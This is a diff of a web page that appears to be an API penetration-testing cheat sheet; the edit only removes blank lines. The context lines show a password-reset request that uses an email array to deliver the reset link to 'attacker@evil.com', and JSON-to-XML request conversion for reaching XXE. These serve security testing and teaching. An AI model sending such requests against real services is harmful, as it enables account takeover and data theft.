@@ -332,7 +332,6 @@ The attacker was able to send a password reset link to an arbitrary email by sen
 POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1
 with body like {&quot;email_address&quot;:[&quot;admin@breadcrumb.com&quot;,&quot;attacker@evil.com&quot;]}
 </code></pre>
-
 <h2 id="json-to-xml-to-xxe">JSON to XML to XXE</h2>
 <p>When the API accept JSON type format payload, then you can try to send the same payload but as a XML file. You can download the Burp extension named "Content Type Converter".</p>
 <blockquote>
@@ -348,7 +347,6 @@ Content-Type: application/json;charset=UTF-8
     &quot;message&quot;: &quot;xxx&quot;
 }
 </code></pre>
-
 <pre><code class="language-none">PUT /api/message HTTP/1.1
 Host: test.com
 ...
@@ -357,7 +355,6 @@ Content-Type: application/xml;charset=UTF-8
 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;
 &lt;message&gt;xxx&lt;/message&gt;
 </code></pre>
-
 <p>If the request is accepted by the API, then you can try to attack with an XXE payload.</p>
 <h2 id="exploit-application-routing">Exploit application routing</h2>
 <p><a href="twitter.com/samwcyo">@samwcyo</a> explains how to exploit some mis-configuration
